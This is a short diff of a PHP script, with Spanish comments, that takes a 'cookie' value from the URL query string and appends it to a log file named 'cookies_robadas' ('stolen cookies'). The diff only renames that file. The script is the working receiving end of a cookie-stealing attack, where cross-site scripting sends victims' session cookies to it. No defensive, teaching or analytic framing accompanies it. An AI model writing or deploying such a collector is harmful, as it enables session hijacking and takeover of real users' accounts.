@@ -5,7 +5,7 @@ ini_set('display_errors', 1);
 // Obtener la cookie
 if (isset($_GET['cookie'])) {
     $cookie = $_GET['cookie'];
-    $archivo = __DIR__ . '/cookies_robadas.txt';
+    $archivo = __DIR__ . '/cookies_robadas_get.txt';
 
     // Guardar la cookie en el archivo
     file_put_contents($archivo, $cookie . PHP_EOL, FILE_APPEND);
